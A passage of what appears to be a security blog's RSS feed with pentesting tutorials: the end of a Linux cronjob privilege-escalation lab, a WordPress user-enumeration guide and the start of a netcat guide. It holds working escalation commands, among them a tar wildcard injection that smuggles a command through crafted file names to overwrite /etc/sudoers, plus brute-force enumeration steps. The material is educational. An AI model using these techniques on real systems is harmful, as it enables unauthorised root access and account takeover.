+<p><img decoding="async" class="alignnone wp-image-25401" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/3-3.png" alt="" width="610" height="224" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/3-3.png 684w, https://www.armourinfosec.com/wp-content/uploads/2020/01/3-3-300x110.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Next thing we need to do is setup cronjob.</p>
+<pre class="theme:familiar lang:sh decode:true ">cat /etc/crontab</pre>
+<p><img decoding="async" class="alignnone wp-image-25374" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/4-2.png" alt="" width="610" height="249" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/4-2.png 668w, https://www.armourinfosec.com/wp-content/uploads/2020/01/4-2-300x123.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Now lets verify our cronjob.</p>
+<pre class="theme:familiar lang:sh decode:true">ls
+date
+ls</pre>
+<p><img decoding="async" class="alignnone wp-image-25402" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/5-3.png" alt="" width="400" height="252" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/5-3.png 593w, https://www.armourinfosec.com/wp-content/uploads/2020/01/5-3-300x189.png 300w" sizes="(max-width: 400px) 100vw, 400px" /></p>
+<h5>Exploiting the vulnerability :</h5>
+<p>We successfully created a cronjob and verified it now lets exploit it. On enumerating the target we see that there is a cronjob running on the system which running the script.</p>
+<p><img decoding="async" class="alignnone wp-image-25376" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/6-2.png" alt="" width="610" height="354" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/6-2.png 650w, https://www.armourinfosec.com/wp-content/uploads/2020/01/6-2-300x174.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Script is world writable file (777 permission) and we can edit it. There are many way from here to escalate privileges. We are going to set <strong>suid</strong> bit on <strong>/bin/bash</strong> by replacing “<strong>rm -r /tmp/demo</strong>” from  “<strong>chmod u+s /bin/bash</strong>”.</p>
+<pre class="theme:familiar lang:sh decode:true ">cat cleanup.py</pre>
+<p><img decoding="async" class="alignnone wp-image-25377" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/7-1.png" alt="" width="610" height="262" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/7-1.png 619w, https://www.armourinfosec.com/wp-content/uploads/2020/01/7-1-300x129.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p><strong>After waiting two minute we will run /bin/bash to escalate privilege.</strong></p>
+<pre class="theme:familiar lang:sh decode:true">whoami
+/bin/bash -p
+whoami</pre>
+<p><img decoding="async" class="alignnone wp-image-25378" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/8-1.png" alt="" width="610" height="205" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/8-1.png 607w, https://www.armourinfosec.com/wp-content/uploads/2020/01/8-1-300x101.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<h4>Wildcard Injection :</h4>
+<h5>Situation where the vulnerability arises :</h5>
+<p>When the command is  assigned to a cronjob, contains a wildcard operator then attacker can go for wildcard injection to escalate privilege. Now consider a situation where sysadmin sets up a cronjob that creates a tar file, of all the content of user and store them in <strong>/var/backup</strong>.</p>
+<h5>Setting up the lab with same vulnerability:</h5>
+<p>Lets create some file in <strong>/home/armour/</strong> data directory which we will backup.</p>
+<pre class="theme:familiar lang:sh decode:true">touch 1.txt 2.txtx 4.txt 5.php
+ls</pre>
+<p><img decoding="async" class="alignnone wp-image-25379" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/9-1.png" alt="" width="610" height="73" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/9-1.png 686w, https://www.armourinfosec.com/wp-content/uploads/2020/01/9-1-300x36.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/9-1-672x82.png 672w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Now we schedule a cronjob to store the backup into <strong>/var/backup</strong></p>
+<pre class="theme:familiar lang:sh decode:true ">cat /etc/crontab</pre>
+<p><img decoding="async" class="alignnone wp-image-25380" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/10-1.png" alt="" width="610" height="236" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/10-1.png 677w, https://www.armourinfosec.com/wp-content/uploads/2020/01/10-1-300x116.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Lets verify out objective.</p>
+<pre class="theme:familiar lang:sh decode:true">ls
+date</pre>
+<p><img decoding="async" class="alignnone wp-image-25381 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/11-2.png" alt="" width="580" height="247" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/11-2.png 580w, https://www.armourinfosec.com/wp-content/uploads/2020/01/11-2-300x128.png 300w" sizes="(max-width: 580px) 100vw, 580px" /></p>
+<h5>Exploiting the vulnerability :</h5>
+<p>We successfully created our working environment, now we will exploit the vulnerability following is the check. Checking cronjob on target gives us following result.</p>
+<p><img decoding="async" class="alignnone wp-image-25382" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/12-1.png" alt="" width="610" height="234" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/12-1.png 645w, https://www.armourinfosec.com/wp-content/uploads/2020/01/12-1-300x115.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Now lets get back to <strong>/home/armour/data</strong> directory and we will create some files.</p>
+<pre class="theme:familiar lang:sh decode:true ">echo 'echo "armour ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; test.sh
+echo "" &gt; "--checkpoint-action=exec=sh test.sh"
+echo "" &gt; --checkpoint=1
+tar cf archive.tar *</pre>
+<p><img decoding="async" class="alignnone wp-image-25383" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1.png" alt="" width="610" height="61" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1.png 675w, https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1-300x30.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1-672x67.png 672w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>When cronjob will run then it will provide <strong>sudo</strong> right to <strong>user:armour</strong>.</p>
+<pre class="theme:familiar lang:sh decode:true ">whoami
+sudo bash -l</pre>
+<p><img decoding="async" class="alignnone wp-image-25384" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/14-1.png" alt="" width="610" height="254" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/14-1.png 615w, https://www.armourinfosec.com/wp-content/uploads/2020/01/14-1-300x125.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/">Linux Privilege Escalation by Exploiting Cronjobs</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>WordPress Enumeration</title>
+		<link>https://www.armourinfosec.com/wordpress-enumeration/</link>
+					<comments>https://www.armourinfosec.com/wordpress-enumeration/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Sat, 25 Jan 2020 14:21:12 +0000</pubDate>
+				<category><![CDATA[Enumeration]]></category>
+		<category><![CDATA[Information Gathering]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25347</guid>
+
+					<description><![CDATA[<p>WordPress User Enumeration These 10 enumeration techniques are a very fast way to identify users of a WordPress installation. With...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/wordpress-enumeration/">WordPress Enumeration</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<h1 class="btx-post-title post-title entry-title">WordPress User Enumeration</h1>
+<p>These <strong>10 enumeration techniques</strong> are a very fast way to <strong>identify users</strong> of a WordPress installation. With valid usernames effective <strong>brute force attacks</strong> can be attempted to <strong>guess the password</strong> of the user accounts.</p>
+<h2>Introduction to WordPress Security</h2>
+<p>There are many common attack vectors that hackers use to attack a WordPress website. In this article we expose many of the common avenues for attack. By revealing these, you can help build your website’s defenses against WordPress attacks.</p>
+<p>There are some great guides available on securing a WordPress installation, this article is not intended to repeat those. To get started with securing a WordPress installation, try the excellent guide on <a href="https://wordpress.org/">wordpress.org</a> or the comprehensive guide on the <a href="https://owasp.org/">OWASP</a> site.</p>
+<p>It is noteworthy that in a managed WordPress hosting service, some of the attacks (and mitigation) listed below will be the responsibility of the hosting provider. If you are self hosting then security and maintenance is your responsibility. Ready to start? Grab our hoodie and start hacking!</p>
+<p>In this article we are going to discuss several ways to identify the valid usernames of any WordPress website.</p>
+<h2>Table Of Contents:</h2>
+<p>1.Usernames enumerating through the Author Archives</p>
+<p>2.WordPress Enumeration via JSON API</p>
+<p>3.WordPress Enumeration via the Login Form</p>
+<p>4.Enumerating WordPress Core Version</p>
+<p>5.WordPress Plugin (and version) Enumeration</p>
+<p>6. WordPress Theme Enumeration</p>
+<p>7.Directory Indexing</p>
+<p>8.Server Vulnerability Testing</p>
+<p>9.WP Scan</p>
+<p>10.Nmap NSE Scripts for WordPress</p>
+<h4>1.Enumerate Usernames Through the Author Archives :</h4>
+<p>In many WordPress installations, it is possible to enumerate WordPress usernames through the author archives, including the admin username. To access the author archives, we just need to add author=n (where n equals any integer) as a parameter to the WordPress home page, as shown below:</p>
+<pre class="theme:familiar lang:sh decode:true ">http://example.com/?author=1</pre>
+<p>The request will be automatically redirected by WordPress to its counterparts:</p>
+<pre class="theme:familiar lang:sh decode:true ">http://example.com/author/admin/</pre>
+<p>Using this method, we will be able to identify all the usernames by fuzzing the author parameter.</p>
+<h4>2.WordPress Enumeration via JSON API :</h4>
+<p>Using a json endpoint, it may be possible to get a list of users on the site. This was restricted in version 4.7.1 that shows only the user that has published a post and the user that has been configured. Prior to this version, all the users were shown by default.</p>
+<pre class="theme:familiar lang:xhtml decode:true ">https://wordpressexample.com/wp-json/wp/v2/users</pre>
+<p>User Enumeration via the JSON user Endpoint</p>
+<p><img decoding="async" class="alignnone wp-image-25352 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/11-1.png" alt="" width="741" height="613" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/11-1.png 741w, https://www.armourinfosec.com/wp-content/uploads/2020/01/11-1-300x248.png 300w" sizes="(max-width: 741px) 100vw, 741px" /></p>
+<p>&nbsp;</p>
+<h4>3.WordPress Enumeration via the Login Form :</h4>
+<p>You must confirm valid users with the login form. Brute forcing the user name is possible using the login form as the response is different for a valid as opposed to an invalid account. Using a tool such as Burp Intruder in Burp Suite, we would load a list of possible usernames and cycle through HTTP POST requests to the WordPress login form, examining the response in each case.</p>
+<p>A HTTP response that matches &#8220;invalid password&#8221; indicates that the username is valid. We could then move on to attacking the password using the same process with a common password list.</p>
+<p><img decoding="async" class="alignnone wp-image-25353 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/2-1.png" alt="" width="266" height="300" /></p>
+<p>&nbsp;</p>
+<h4>4.Enumerating WordPress Core Version :</h4>
+<p>Three simple methods can be used to determine the core version of WordPress.</p>
+<h5>4.1 Meta Generator</h5>
+<p>Check the HTML source of the page for a meta generator tag in the HEAD section of the HTML source. This example is taken from the source of a default WP install of the version 3.5.2 and of twenty twelve theme. From the source HTML:</p>
+<pre class="theme:familiar lang:css decode:true ">&lt;meta name="generator" content="WordPress 3.5.2" /&gt;</pre>
+<h5>4.2 Version in readme.html</h5>
+<p>If the meta tag has been disabled, check for the presence of /readme.html from root of the install. Early versions of WordPress had the version right there at the top of the Read Me file. But the newer versions of WordPress have removed the version from the ReadMe file.</p>
+<p><img decoding="async" class="alignnone wp-image-25354" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/3-1.png" alt="" width="741" height="79" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/3-1.png 854w, https://www.armourinfosec.com/wp-content/uploads/2020/01/3-1-300x32.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/3-1-768x82.png 768w" sizes="(max-width: 741px) 100vw, 741px" /></p>
+<p>Version in HTML source of site.</p>
+<p>In the HTML source, the version is often appended as a parameter on links to javascript and css resources that the page is loading. Depending on the plugin, this will not always be the case and sites that have minified js and css may not have all this information leaks present.</p>
+<h5>4.3 Security Vulnerabilities in WordPress Core</h5>
+<p>If an attacker finds a site with an older WordPress Core version, this may be directly exploitable via a security vulnerability in the WordPress core, In addition, it is a clear indication that the site is not well maintained. In a poorly managed site, other components (plugins / themes) may not have been updated; in this case, the chance of a successful attack has increased considerably.</p>
+<h4>5.WordPress Plugin (and version) Enumeration :</h4>
+<p>During WordPress Plugin Enumeration, we attempt to find as many installed plugins as we can (even those that are disabled). The knowledge of the installed WordPress plugins may allow us to identify the version and research whether it is vulnerable to known exploits.</p>
+<p>Passive analysis: It can be used to find plugins through regular HTTP requests to the WordPress site.<br />
+Active enumeration: It is more aggressive and usually involves using a script or tool to perform hundreds or even thousands of mostly invalid HTTP requests.</p>
+<p>Reading through the HTML source of the WordPress site can reveal installed plugins through javascript links, comments and resources, such as CSS that are loaded into the page. These are the easiest plugins to discover and require no aggressive testing of the target site. Even the HTTP headers can reveal information such as the X-Powered-By header that reveals the presence of the W3-Total-Cache plugin. Some plugins do not leave traces in the HTML source; to find all the installed plugins you have to be more aggressive. A number of tools can brute force known plugin lists from the path /wp-content/plugins/ * plugin to test * /. The web server response will usually reveal valid directories (often with HTTP 403) as opposed to unknown directories on the web server with its HTTP response code.</p>
+<p>Once you have a list of plugins that are present on the site, your WordPress scanner or manual requests can be used to determine the version of the plugin. In the readme.txt, we can see the version of the plugin. Compare this against known exploits and we can get a good idea if the site is vulnerable without actually throwing the exploit.</p>
+<h4>6. WordPress Theme Enumeration :</h4>
+<p>WordPress themes can contain vulnerabilities that might expose the site to compromise. Themes are collections of PHP code with HTML and CSS resources. More complex themes have more included components and are more likely to introduce security vulnerabilities. The enumeration of the theme is similar to the detection of plugins. The theme path is often visible in the HTML of the page source. The CSS file getting loaded from the theme will often reveal the path. With the path we have the theme name, and we can load the readme.txt to confirm the theme in use and its version.</p>
+<pre class="theme:familiar lang:sh decode:true ">curl http://examplewp.com/wp-content/themes/Avada/readme.txt</pre>
+<p>An important consideration when testing for vulnerable WordPress Themes (and plugins) is that a theme that is installed yet not active may still have code that is accessible and vulnerable. This is why brute force testing for theme paths is an important step when assessing an unknown WordPress installation.</p>
+<p><img decoding="async" class="alignnone wp-image-25355" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/4-1.png" alt="" width="741" height="108" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/4-1.png 900w, https://www.armourinfosec.com/wp-content/uploads/2020/01/4-1-300x44.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/4-1-768x112.png 768w" sizes="(max-width: 741px) 100vw, 741px" /></p>
+<h4>7.Directory Indexing :</h4>
+<p>Directory indexing enabled on plugins directory. Directory indexing is a function of the web server that allows you to view the contents of a directory in the web accessible path. Viewing the contents of a directory allows an attacker to gather valuable information about the installation such as installed plugins and themes without the need to brute force the paths.</p>
+<p>To check for directory indexing, you can browse to folder locations and see if you get a response that includes &#8220;Index Of&#8221; and a list of folders / files. Common locations to check would be:</p>
+<pre class="theme:familiar lang:sh decode:true">/wp-content/
+/wp-content/plugins/
+/wp-content/themes/
+/uploads/
+/images/</pre>
+<h4>8.Server Vulnerability Testing :</h4>
+<p>In this phase, we move into testing network services rather than direct testing of the WordPress installation. Port scanning is the standard technique for the discovery of network services running on the server.</p>
+<p>Services that might be present on a WordPress host:</p>
+<p><strong>MySQL</strong> Server Remotely Accessible (port 3306)<br />
+<strong>CPANEL</strong> administration login portal (port 2082 / 2083)<br />
+<strong>Webmin</strong> administration (port 10000)<br />
+<strong>FTP</strong> service for file system access<br />
+<strong>SSH</strong> for remote control<br />
+Other web services with admin or other sites (port 8080 / 8888 etc)</p>
+<p>Any of the above services may allow access to or control of the server through either a security vulnerability or a compromised password. Port scanning can be conducted using the excellent Nmap Port Scanner or an alternative security tool. Carrying on from our enumeration of network services using the port scanner, we could run vulnerability scans against the discovered services to identify exploitable services or other items of interest.</p>
+<h5>8.1 Nikto Vulnerability Scanner</h5>
+<p>Nikto is another vulnerability scanner that focuses on the discovery of known vulnerable scripts, configuration mistakes and other web server items of interest. The Nikto tool has been around for many years yet still finds a place in the penetration testers toolbox. Tools such as this throw tens of thousands of tests against the target in an attempt to discover known vulnerabilities and other low hanging fruits. It is a noisy process filling the target system logs with 404&#8217;s and other errors. Not recommended if you are going after a target ninja style (pentest / red team).</p>
+<h4>9.WPScan :</h4>
+<p>WPScan is a popular WordPress security testing tool that ties many of these simple enumeration techniques together, enabling users to quickly enumerate a WordPress installation. It has a commercial license that restricts the use for personal testing of WordPress sites and non-commercial usage.It attempts to identify users, plugins, and themes, depending on the selected command line options, and also show vulnerabilities for each of the discovered plugins.</p>
+<p><img decoding="async" class="alignnone wp-image-25357 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/6-1.png" alt="" width="500" height="197" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/6-1.png 500w, https://www.armourinfosec.com/wp-content/uploads/2020/01/6-1-300x118.png 300w" sizes="(max-width: 500px) 100vw, 500px" /></p>
+<p><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></p>
+<h4>10.Nmap NSE Scripts for WordPress :</h4>
+<p>Nmap comes bundled with NSE scripts that extend the functionality of this popular port scanner. A few of the Nmap NSE scripts are particularly helpful for enumerating WordPress users, plugins, and themes using the same techniques we have previously discussed. The best thing about this option is that if you have Nmap installed, you already have these scripts ready to go.</p>
+<pre class="theme:familiar lang:sh decode:true ">┌─[root@Dasagreeva]─[/usr/share/nmap/scripts]
+└──╼ #ls -lha |grep wordpress
+-rw-r--r-- 1 root root 5.0K Nov 26 14:51 http-wordpress-brute.nse
+-rw-r--r-- 1 root root 11K Nov 26 14:51 http-wordpress-enum.nse
+-rw-r--r-- 1 root root 4.6K Nov 26 14:51 http-wordpress-users.nse</pre>
+<p>&nbsp;</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/wordpress-enumeration/">WordPress Enumeration</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/wordpress-enumeration/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Hacking with Netcat : A Comprehensive Guide</title>
+		<link>https://www.armourinfosec.com/hacking-with-netcat-a-comprehensive-guide/</link>
+					<comments>https://www.armourinfosec.com/hacking-with-netcat-a-comprehensive-guide/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Wed, 22 Jan 2020 12:59:53 +0000</pubDate>
+				<category><![CDATA[Enumeration]]></category>
+		<category><![CDATA[Penetration Testing]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25276</guid>
+
+					<description><![CDATA[<p>Netcat is a featured networking utility tool which reads and writes data across network connections, using the TCP/IP protocol. It...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/hacking-with-netcat-a-comprehensive-guide/">Hacking with Netcat : A Comprehensive Guide</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p><strong>Netcat</strong> is a featured networking utility tool which reads and writes data across network connections, using the TCP/IP protocol.<br />
+It is designed to be a reliable &#8220;back-end&#8221; tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. It&#8217;s so simple, powerful, and useful that many people within the IT community refer to it as the &#8220;<strong>Swiss Army Knife of Hackers</strong>&#8220;.</p>
+<h5><strong>Features :</strong></h5>
+<ul>
+<li>Outbound and Inbound connections, TCP or UDP, to or from any ports.</li>
+<li>Featured tunneling mode which allows also special tunneling such as UDP to TCP, with the possibility of specifying all network parameters (source port/interface, listening port/interface, and the remote host allowed to connect to the tunnel).</li>
+<li>Built-in port-scanning capabilities, with randomization</li>
+<li>Advanced usage options, such as buffered send-mode (one line every N seconds), and hex dump (to stderr or to a specified file) of transmitted and received data.</li>
+<li>Can read command line arguments from standard input</li>
+<li>Optional ability to let another program service establish connections</li>
+<li>To read a banner from the port</li>
+<li>Encrypted file transfer</li>
+<li>Command Line Chat Server</li>
+</ul>
+<h5><strong>General Syntax :</strong></h5>
+<pre class="theme:familiar lang:sh decode:true">nc [options] host port
+</pre>
+<h5><strong>Getting start with Netcat :<br />
+</strong></h5>
+<p>Netcat can be used from any directory. Let&#8217;s start with the basic option which will show us the help page by the following command.</p>
+<pre class="theme:familiar lang:sh decode:true">nc -h
+</pre>
+<p><img decoding="async" class="alignnone wp-image-25315" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/2-1024x608.png" alt="" width="605" height="359" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/2-1024x608.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/01/2-300x178.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/2-768x456.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/01/2-1536x912.png 1536w, https://www.armourinfosec.com/wp-content/uploads/2020/01/2.png 1707w" sizes="(max-width: 605px) 100vw, 605px" /></p>
+<h5><strong>Port Scanning :</strong></h5>
+<p>One of the most common uses for netcat is as a Port Scanner. It can be used to know which ports are open and running services on a target machine. It can scan a single or multiple or a range of open ports.<br />
+We will use <strong>-z</strong> option to perform only scan and <strong>-v</strong> option enables verbose mode options for a port scan like below.</p>
+<pre class="theme:familiar lang:sh decode:true">nc -v -z 192.168.1.200 80</pre>
+<p><img decoding="async" class="alignnone wp-image-25317 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/3.png" alt="" width="610" height="67" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/3.png 610w, https://www.armourinfosec.com/wp-content/uploads/2020/01/3-300x33.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<pre class="theme:familiar lang:sh decode:true ">nc -v -z 192.168.1.200 21-25</pre>
+<p><img decoding="async" class="alignnone wp-image-25319" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/4.png" alt="" width="604" height="150" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/4.png 622w, https://www.armourinfosec.com/wp-content/uploads/2020/01/4-300x74.png 300w" sizes="(max-width: 604px) 100vw, 604px" /></p>
+<h5><strong>Banner Grabbing :</strong></h5>
+<p>Netcat can be also used for grabbing service banner viz. Service Version, Status etc. To grab the target port banner from netcat, use the following command :</p>
+<pre class="theme:familiar lang:sh decode:true ">nc -v 192.168.1.200 22</pre>
+<p><img decoding="async" class="alignnone wp-image-25320 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/5.png" alt="" width="608" height="90" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/5.png 608w, https://www.armourinfosec.com/wp-content/uploads/2020/01/5-300x44.png 300w" sizes="(max-width: 608px) 100vw, 608px" /></p>
+<h5><strong>Connecting to a Server :</strong></h5>
+<p>Here, we will connect a FTP Server with the IP Address 192.168.1.200. To connect to the server at a specific port where a particular service running. In our case, the port is 21 i.e. FTP.</p>
+<pre class="theme:familiar lang:sh decode:true ">nc 192.168.1.200 21</pre>
+<p><img decoding="async" class="alignnone wp-image-25321" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/6.png" alt="" width="600" height="223" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/6.png 776w, https://www.armourinfosec.com/wp-content/uploads/2020/01/6-300x111.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/6-768x285.png 768w" sizes="(max-width: 600px) 100vw, 600px" /></p>
+<h5><strong>Command Line Chat Server :<br />
+</strong></h5>
+<p>Netcat can also be used to communication between two users. We need to establish a connection before chatting. For this we will need need two devices. One will play the role of initiator and other will be a listener to start the conversation. Once the connection is established, communication can be done from both ends.</p>
+<p><strong>User 1</strong><br />
+<strong>OS</strong>: Kali Linux<br />
+<strong>IP Address</strong>: 192.168.1.100<br />
+<strong>Role</strong>: Listener</p>
+<p><strong>User 2</strong><br />
+<strong>OS</strong>: CentOS<br />
+<strong>IP Address</strong>: 192.168.1.200<br />
+<strong>Role</strong>: Initiator</p>
+<p>On <strong>User</strong> 1, we will start a listener on port <strong>4455</strong> using options <strong>-l</strong> for listen, <strong>-v</strong> verbose mode, <strong>-p</strong> for port</p>
+<pre class="theme:familiar lang:sh decode:true ">nc -lvp 4455</pre>
+<p><img decoding="async" class="alignnone wp-image-25323" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/7.png" alt="" width="605" height="113" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/7.png 696w, https://www.armourinfosec.com/wp-content/uploads/2020/01/7-300x56.png 300w" sizes="(max-width: 605px) 100vw, 605px" /></p>
+<p>On <strong>User 2</strong>, we will create an initiator by providing IP address of listener followed by the listener port.</p>
+<pre class="theme:familiar lang:sh decode:true ">nc -v 192.168.1.100 4455</pre>
+<p><img decoding="async" class="alignnone wp-image-25324 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/8.png" alt="" width="490" height="107" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/8.png 490w, https://www.armourinfosec.com/wp-content/uploads/2020/01/8-300x66.png 300w" sizes="(max-width: 490px) 100vw, 490px" /></p>
+<h5><strong>Transferring Files with Netcat :</strong></h5>
+<p>Netcat can also be used to transfer files, both text and binary, from one computer to<br />
+another. Here we will create a scenario where we will transfer a file from a Kali system to Windows system.</p>
+<p>On the <strong>Windows system</strong>, we will set up a netcat listener on port <strong>4455</strong> and redirect any<br />
+incoming input into a file called <strong>output.txt</strong>.</p>
+<pre class="theme:familiar lang:sh decode:true ">nc.exe -nlvp 4455 &gt; output.txt</pre>
+<p><img decoding="async" class="alignnone wp-image-25326" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/9.png" alt="" width="605" height="63" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/9.png 570w, https://www.armourinfosec.com/wp-content/uploads/2020/01/9-300x31.png 300w" sizes="(max-width: 605px) 100vw, 605px" /></p>
+<p>On the <strong>Linux system</strong>, we will push the file to the Windows system through port <strong>4455</strong>:</p>
+<pre class="theme:familiar lang:sh decode:true ">nc -v 192.168.1.200 4455  &lt; demo.txt</pre>
+<p><img decoding="async" class="alignnone wp-image-25327" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/10.png" alt="" width="605" height="68" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/10.png 517w, https://www.armourinfosec.com/wp-content/uploads/2020/01/10-300x34.png 300w" sizes="(max-width: 605px) 100vw, 605px" /></p>
+<p>The connection which will be received by netcat on the <strong>Windows system</strong> as shown below:</p>
+<p><img decoding="async" class="alignnone wp-image-25328" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/11.png" alt="" width="605" height="103" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/11.png 760w, https://www.armourinfosec.com/wp-content/uploads/2020/01/11-300x51.png 300w" sizes="(max-width: 605px) 100vw, 605px" /></p>
+<h5><strong>Randomize Port :</strong></h5>
+<p>If we can’t decide our very own port to establish a Netcat connection. Then we can use a special <strong>-r</strong> parameter which gives us randomize local port.</p>
+<pre class="theme:familiar lang:sh decode:true ">nc -lv -r</pre>
+<p><img decoding="async" class="alignnone wp-image-25329 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/12.png" alt="" width="344" height="50" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/12.png 344w, https://www.armourinfosec.com/wp-content/uploads/2020/01/12-300x44.png 300w" sizes="(max-width: 344px) 100vw, 344px" /></p>
+<h5><strong>Simple Web Server with Netcat :</strong></h5>
+<p>Netcat can be used as a simple web server. Actually, web servers are very simple if there are no special configuration requirements. Web servers only send HTML pages over HTTP protocol.</p>
+<pre class="theme:familiar lang:sh decode:true ">while : ; do ( echo -ne "HTTP/1.1 200 OK\r\n" ; cat index.html; ) | nc -l -p 8080 ; done</pre>
+<p><img decoding="async" class="alignnone wp-image-25330" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1024x187.png" alt="" width="605" height="111" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/13-1024x187.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/01/13-300x55.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/13-768x141.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/01/13.png 1213w" sizes="(max-width: 605px) 100vw, 605px" /></p>
+<h5><strong>Remote Administration with Netcat :</strong></h5>
+<p>One of the most useful features of netcat is its ability to do command redirection. Netcat can take an executable file and redirect the input, output, and error messages to a TCP/UDP port rather than the default console.<br />
+To further explain this, consider the cmd.exe executable. By redirecting the stdin, stdout, and stderr to the network, we can bind cmd.exe to a local port. Anyone connecting to this port will be presented with a command prompt belonging to this<br />
+computer. To further drive this home, consider the following scenario, involving <strong>Windwos</strong> and <strong>Kali</strong>.</p>
+<p>First, we will start a listener on <strong>Windows system</strong> for remote connection which will take place from <strong>Kali</strong>.</p>
